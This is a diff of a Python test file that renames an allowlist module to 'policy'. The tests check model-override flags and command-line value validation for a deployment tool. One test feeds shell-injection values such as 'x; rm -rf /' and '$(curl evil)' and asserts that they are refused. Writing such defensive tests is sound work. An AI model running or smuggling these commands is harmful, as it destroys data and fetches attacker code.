@@ -3,7 +3,7 @@
 Hermetic, no cluster / GPU / network. Covers the three acceptance criteria:
 
   * a standup (and plan/run/experiment) can run with an explicit ``-m`` model NOT pinned by
-    the spec — ``build_argv`` emits it as pure mechanism, the allowlist permits + value-pins it;
+    the spec — ``build_argv`` emits it as pure mechanism, the policy permits + value-pins it;
   * the capacity pre-flight sees the SAME model — the standup ``models`` id and the
     ``check_capacity(overrides={'model': …})`` id land on the IDENTICAL plan_config path
     (``model.name``), so the pre-flight validates exactly what the standup will deploy;
@@ -20,7 +20,7 @@ from pathlib import Path
 import pytest
 
 from app.capacity.planner import _OVERRIDE_PATHS, apply_overrides
-from app.security.allowlist import MUTATING, READ_ONLY
+from app.security.policy import MUTATING, READ_ONLY
 from app.tools.run.execute import build_argv
 from app.tools.schemas import ExecuteInput
 from tests._helpers import _argv
@@ -75,7 +75,7 @@ def test_execute_schema_models_defaults_to_none():
 
 
 # ---------------------------------------------------------------------------
-# allowlist — the override is permitted AND its value is pinned (DATA)
+# policy — the override is permitted AND its value is pinned (DATA)
 # ---------------------------------------------------------------------------
 
 
@@ -88,31 +88,31 @@ def test_execute_schema_models_defaults_to_none():
         ("experiment", "--models", ["-e", "workspace/exp.yaml"]),
     ],
 )
-def test_allowlist_permits_model_override_short_and_long(allowlist, catalog, subcommand, short_long, extra):
+def test_policy_permits_model_override_short_and_long(policy, catalog, subcommand, short_long, extra):
     # Both the short -m (emitted by build_argv) and the subcommand's upstream long spelling
-    # are allowlisted with a value constraint.
+    # are policy-allowed with a value constraint.
     for flag in ("-m", short_long):
-        d = allowlist.validate(_argv(subcommand, *extra, flag, MODEL), catalog=catalog)
+        d = policy.validate(_argv(subcommand, *extra, flag, MODEL), catalog=catalog)
         assert d.allowed, f"{flag} should be allowed on {subcommand}: {d.reason}"
 
 
-def test_model_override_does_not_change_mode_classification(allowlist, catalog):
+def test_model_override_does_not_change_mode_classification(policy, catalog):
     # standup stays mutating with -m; plan stays a read-only preview with -m.
-    assert allowlist.validate(_argv("standup", "-m", MODEL), catalog=catalog).mode == MUTATING
-    assert allowlist.validate(_argv("plan", "-m", MODEL), catalog=catalog).mode == READ_ONLY
+    assert policy.validate(_argv("standup", "-m", MODEL), catalog=catalog).mode == MUTATING
+    assert policy.validate(_argv("plan", "-m", MODEL), catalog=catalog).mode == READ_ONLY
     # --dry-run still downgrades a model-override standup to a read-only preview.
-    d = allowlist.validate(_argv("standup", "-m", MODEL, "--dry-run"), catalog=catalog)
+    d = policy.validate(_argv("standup", "-m", MODEL, "--dry-run"), catalog=catalog)
     assert d.allowed and d.mode == READ_ONLY
 
 
-def test_model_id_value_constraint_is_pinned(allowlist, catalog):
+def test_model_id_value_constraint_is_pinned(policy, catalog):
     # A valid HF id passes the model_id regex; a metachar-laden injection value is REFUSED
     # (the value constraint + the defense-in-depth metacharacter screen both bite).
-    assert allowlist.validate(_argv("standup", "-m", "facebook/opt-125m"), catalog=catalog).allowed
-    assert not allowlist.validate(
+    assert policy.validate(_argv("standup", "-m", "facebook/opt-125m"), catalog=catalog).allowed
+    assert not policy.validate(
         _argv("standup", "-m", "x; rm -rf /"), catalog=catalog
     ).allowed
-    assert not allowlist.validate(
+    assert not policy.validate(
         _argv("standup", "--models", "$(curl evil)"), catalog=catalog
     ).allowed
 
